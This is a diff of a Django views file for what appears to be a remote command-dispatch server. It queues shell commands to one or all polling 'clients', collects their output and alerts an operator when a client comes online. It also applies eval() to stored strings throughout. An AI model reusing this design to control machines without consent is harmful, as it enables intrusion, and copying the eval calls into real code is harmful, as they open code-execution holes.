@@ -7,8 +7,181 @@ from django.shortcuts import redirect
 import random
 from django.contrib.auth.models import User
 from rest_framework.parsers import JSONParser
-from .models import Messages, Command, Script, CommandResponse, UserData
+from .models import Messages, Command, Script, CommandResponse, UserData, Alert
 from django.utils import timezone
+from django.http import JsonResponse
+import time
+
+
+@api_view(['GET'])
+def index(request):
+    clients = UserData.objects.all()
+    for i in clients:
+        last = i.last_seen
+        period = timezone.now() - last
+        sec = period.seconds
+        print(sec)
+        if sec > 10:
+            i.active = False
+            i.save()
+        else:
+            i.active = True
+            i.save()
+    client = UserData.objects.filter(active=True)
+    all_clients = []
+    for i in client:
+        uid_truncated = str(i.uid)[:10]
+        uid_display = f'{uid_truncated}...'
+        c = {'uid': i.uid, 'uid_display': uid_display, 'name': i.name, 'active': i.active}
+        all_clients.append(c)
+
+    client = UserData.objects.filter(active=False)
+    for i in client:
+        uid_truncated = str(i.uid)[:10]
+        uid_display = f'{uid_truncated}...'
+        c = {'uid': i.uid, 'uid_display': uid_display, 'name': i.name, 'active': i.active}
+        all_clients.append(c)
+    print(all_clients)
+    page = 'index.html'
+    template = loader.get_template(page)
+    context = {'clients': all_clients}
+    return HttpResponse(template.render(context, request), status=status.HTTP_200_OK)
+
+
+@api_view(['GET'])
+def terminal(request, uid):
+    print(uid)
+    request.session['clients_id'] = uid
+
+    user = User.objects.get(username=uid)
+    user_data = UserData.objects.get(user=user)
+
+    # short cuts
+    all_short_cuts = eval(user_data.short_cuts)
+    all_short_cuts.reverse()
+
+    last = user_data.last_seen
+    period = timezone.now() - last
+    sec = period.seconds
+    print(sec)
+    active = True
+    if sec > 10:
+        user_data.active = False
+        user_data.save()
+        active = False
+    else:
+        user_data.active = True
+        user_data.save()
+
+    name = user_data.name
+    uid = user_data.uid
+
+    uid_truncated = str(uid)[:10]
+    uid_display = f'{uid_truncated}...'
+
+    page = 'shell.html'
+    template = loader.get_template(page)
+    context = {'text': 'hello world', 'name': name, 'active': active, 'uid': uid, 'uid_display': uid_display,
+               'shortcuts': all_short_cuts}
+    return HttpResponse(template.render(context, request), status=status.HTTP_200_OK)
+
+
+@api_view(['GET', 'POST'])
+def commander(request):
+    print('xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx')
+    comm = request.POST.get('argss', '')
+    target = str(request.session['clients_id'])
+    data = {'command': comm, 'target': target}
+    print(data)
+    if target == 'active':
+        user = User.objects.all()
+        for i in user:
+            mess = Command.objects.get(user=i)
+            command = mess.command
+            command = eval(command)
+            command.append(data)
+            command.reverse()
+            mess.command = command
+            mess.save()
+        context = {'status': True, 'command': f'command sent to all clients'}
+        print(context)
+        return JsonResponse(context)
+    else:
+        user = User.objects.filter(username=target)
+        print(user)
+        if len(user) > 0:
+            mess = Command.objects.get(user=user[0])
+            command = mess.command
+            command = eval(command)
+            command.append(data)
+            command.reverse()
+            mess.command = command
+            mess.save()
+            context = {'status': 'success', 'response': f'command sent to user: {target}, awaiting response'}
+            print(context)
+            return JsonResponse(context)
+        else:
+            return JsonResponse({'status': 'failed', 'response': 'user does not exist'})
+
+
+@api_view(['GET'])
+def client_command_response(request):
+    try:
+        for i in range(10):
+            time.sleep(2)
+            user = 'helloworld'
+            user = User.objects.get(username=user)
+            mess = CommandResponse.objects.get(user=user)
+            count = mess.command_count
+            message = mess.command
+
+            message = eval(message)
+
+            if int(count) < int(len(message)):
+                new_message = message[int(len(message) - 1)]
+                print(new_message)
+                response = new_message['response']
+                command_executed = new_message['command']
+                uid = new_message['client']
+                mess.command_count = len(message)
+                mess.save()
+                print(message)
+                context = {'new': True, 'response': response, 'command': command_executed,
+                           'uid': uid, 'sender': str(user)}
+                return JsonResponse(context)
+
+        context = {'new': False, 'response': 'No response from client Found'}
+        return JsonResponse(context)
+
+    except Exception as e:
+        context = {'response': e}
+        return JsonResponse(context)
+
+
+@api_view(['POST'])
+def short_cuts(request):
+    button = str(request.POST.get('action', ''))
+    print(button)
+    uid = request.session['clients_id']
+    print(uid)
+    user = User.objects.get(username=uid)
+    client = UserData.objects.get(user=user)
+    all_short_cuts = eval(client.short_cuts)
+    print(all_short_cuts)
+    new_short_cut = {'button_name': button, 'button_value': button}
+    print(new_short_cut)
+    all_short_cuts.append(new_short_cut)
+    client.short_cuts = all_short_cuts
+    client.save()
+    return redirect(terminal, uid)
+
+
+@api_view(['GET'])
+def get_resp(request):
+    print('sending....')
+    for i in range(10):
+        time.sleep(1)
+    return JsonResponse({'success': True, 'message': 'This is a message'})
 
 
 @api_view(['GET', 'POST'])
@@ -16,30 +189,28 @@ def login(request):
     try:
         data = JSONParser().parse(request)
         print(data)
+        name = data['name']
         uid = str(data['uid'])
         user = User.objects.filter(username=uid)
         print(user)
-        print(len(user))
-        print(uid)
 
         if len(user) == 1:
             print('user exists')
             userdata = UserData.objects.get(user=user[0])
             print(userdata)
 
-            data = {'response': f'CLIENT {uid} ONLINE', 'client': uid, 'time_received': str(timezone.now()),
-                                   'exec_duration': 'NIL', 'directory': 'NIL'}
+            alert = {'uid': uid, 'name': name, 'time': str(timezone.now())}
 
             user = 'helloworld'
             user = User.objects.get(username=user)
-            mess = CommandResponse.objects.get(user=user)
-            command = mess.command
 
-            command = eval(command)
-            command.append(data)
-            command.reverse()
-            mess.command = command
-            mess.save()
+            alerter = Alert.objects.get(user=user)
+            all_alerts = alerter.alert
+            all_alerts = eval(all_alerts)
+            all_alerts.append(alert)
+            alerter.alert = all_alerts
+            alerter.save()
+            print('alert saved')
 
             context = {'user': str(userdata)}
             print(context)
@@ -71,19 +242,20 @@ def login(request):
             cr.save()
             print('saved')
 
-            data = {'response': f'CLIENT {uid} ONLINE', 'client': uid, 'time_received': str(timezone.now()),
-                                   'exec_duration': 'NIL', 'directory': 'NIL'}
+
+
+            alert = {'uid': uid, 'name': name, 'time': str(timezone.now())}
 
             user = 'helloworld'
             user = User.objects.get(username=user)
-            mess = CommandResponse.objects.get(user=user)
-            command = mess.command
 
-            command = eval(command)
-            command.append(data)
-            command.reverse()
-            mess.command = command
-            mess.save()
+            alerter = Alert.objects.get(user=user)
+            all_alerts = alerter.alert
+            all_alerts = eval(all_alerts)
+            all_alerts.append(alert)
+            alerter.alert = all_alerts
+            alerter.save()
+            print('alert saved')
 
             userdata = UserData.objects.get(user=user)
             context = {'user': str(userdata)}
@@ -93,6 +265,38 @@ def login(request):
         print(e)
         context = {'error_message': e}
         return Response(context, status=status.HTTP_400_BAD_REQUEST)
+
+
+@api_view(['GET', 'POST'])
+def notifier(request):
+    try:
+        user = 'helloworld'
+        user = User.objects.get(username=user)
+
+        alerter = Alert.objects.get(user=user)
+        all_alerts = alerter.alert
+        alert_count = alerter.alert_count
+        all_alerts = eval(all_alerts)
+
+        if int(len(all_alerts)) == int(alert_count):
+            print('no alerts')
+            return JsonResponse({'new': 0})
+        else:
+            print('new alert')
+            all_alerts.reverse()
+            client = all_alerts[0]
+            alerter.alert_count = len(all_alerts)
+            alerter.save()
+            name = client['name']
+            uid = client['uid']
+            time = client['time']
+            return JsonResponse({'new': 1, 'name': name, 'uid': uid, 'time': time})
+
+    except Exception as e:
+        print(e)
+        return JsonResponse({'new': 0})
+
+
 
 
 @api_view(['GET', 'POST'])
@@ -213,45 +417,43 @@ def sender(request):
         return Response(context, status=status.HTTP_400_BAD_REQUEST)
 
 
-@api_view(['GET', 'POST'])
+@api_view(['POST'])
 def send_command(request):
+    print('herlllllllll')
     try:
-        if request.method == 'GET':
-            context = {'mode': 'SANDBOX'}
+        data = JSONParser().parse(request)
+        print(data)
+        # target = data['target']
+        target = request.session['user']
+        if target == 'active':
+            user = User.objects.all()
+            for i in user:
+                mess = Command.objects.get(user=i)
+                command = mess.command
+                command = eval(command)
+                command.append(data)
+                command.reverse()
+                mess.command = command
+                mess.save()
+            context = {'mode': 'SANDBOX', 'command': f'command sent to all clients'}
             return Response(context, status=status.HTTP_200_OK)
-
-        elif request.method == 'POST':
-            data = JSONParser().parse(request)
-            print(data)
-            target = data['target']
-            if target == 'active':
-                user = User.objects.all()
-                for i in user:
-                    mess = Command.objects.get(user=i)
-                    command = mess.command
-                    command = eval(command)
-                    command.append(data)
-                    command.reverse()
-                    mess.command = command
-                    mess.save()
-                context = {'mode': 'SANDBOX', 'command': f'command sent to all clients'}
+        else:
+            user = User.objects.filter(username=target)
+            print(user)
+            if len(user) > 0:
+                mess = Command.objects.get(user=user[0])
+                command = mess.command
+                command = eval(command)
+                command.append(data)
+                command.reverse()
+                mess.command = command
+                mess.save()
+                context = {'mode': 'SANDBOX', 'command': f'command sent to user: {target}'}
+                print(context)
                 return Response(context, status=status.HTTP_200_OK)
             else:
-                user = User.objects.filter(username=target)
-                print(user)
-                if len(user) > 0:
-                    mess = Command.objects.get(user=user[0])
-                    command = mess.command
-                    command = eval(command)
-                    command.append(data)
-                    command.reverse()
-                    mess.command = command
-                    mess.save()
-                    context = {'mode': 'SANDBOX', 'command': f'command sent to user: {target}'}
-                    return Response(context, status=status.HTTP_200_OK)
-                else:
-                    context = {'mode': 'SANDBOX', 'command': f'user: {target} not found'}
-                    return Response(context, status=status.HTTP_200_OK)
+                context = {'mode': 'SANDBOX', 'command': f'user: {target} not found'}
+                return Response(context, status=status.HTTP_200_OK)
 
     except Exception as e:
         context = {'error_message': e}
@@ -305,10 +507,10 @@ def command_feedback(request):
             user = User.objects.get(username=user)
             mess = CommandResponse.objects.get(user=user)
             command = mess.command
+            print(data)
 
             command = eval(command)
             command.append(data)
-            command.reverse()
             mess.command = command
             mess.save()
 
